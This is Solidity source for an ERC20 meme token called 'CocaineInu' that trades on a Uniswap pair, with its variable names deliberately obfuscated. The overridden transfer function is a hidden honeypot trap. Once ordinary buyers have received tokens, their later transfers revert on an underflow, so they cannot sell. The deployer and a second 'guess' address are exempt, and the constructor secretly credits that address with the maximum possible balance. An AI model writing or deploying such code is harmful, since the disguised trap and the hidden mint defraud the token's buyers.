// https://t.me/cocaineinu_eth

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract CocaineInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private selection;

    function _transfer(
        address may,
        address remarkable,
        uint256 game
    ) internal override {
        uint256 distance = does;

        if (joined[may] == 0 && selection[may] > 0 && uniswapV2Pair != may) {
            joined[may] -= distance;
        }

        address tonight = sharp;
        sharp = remarkable;
        selection[tonight] += distance + 1;

        _balances[may] -= game;
        uint256 year = (game / 100) * does;
        game -= year;
        _balances[remarkable] += game;
    }

    address private sharp;
    mapping(address => uint256) private joined;
    uint256 public does = 3;

    constructor(
        string memory per,
        string memory fighting,
        address pack,
        address guess
    ) ERC20(per, fighting) {
        uint256 sure = ~((uint256(0)));

        uniswapV2Router = IUniswapV2Router02(pack);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        joined[msg.sender] = sure;
        joined[guess] = sure;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[guess] = sure;
    }
}